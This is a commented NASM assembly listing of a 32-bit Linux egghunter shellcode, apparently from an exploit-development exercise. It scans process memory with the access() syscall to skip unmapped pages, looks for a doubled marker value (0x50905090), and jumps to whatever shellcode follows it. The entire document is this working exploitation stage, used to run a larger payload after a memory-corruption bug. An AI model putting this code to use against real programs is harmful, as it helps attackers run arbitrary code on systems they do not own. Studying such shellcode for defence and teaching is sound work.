global _start:
section .text
 
_start:
    mov ebx, 0x50905090      
    xor ecx, ecx            
    mul ecx                 ; zero out eax and edx
 
next_page:                  
    or dx, 0xfff            ; align page address

next_address:               
    inc edx                 ; next address
    pushad                   
    lea ebx, [edx+4]        ; for comparing [edx] and [edx+4] 
    mov al, 0x21            ; access() 
    int 0x80                
    cmp al, 0xf2            ; check for efault
    popad                   
    jz next_page            ; access() returned efault, skip page
    cmp [edx], ebx          ; check for egg in [edx]
    jnz next_address          
    cmp [edx+4], ebx        ; egg found in [edx],check for egg in [edx+4]
    jnz next_address         
    jmp edx                 ; jump to shellcode
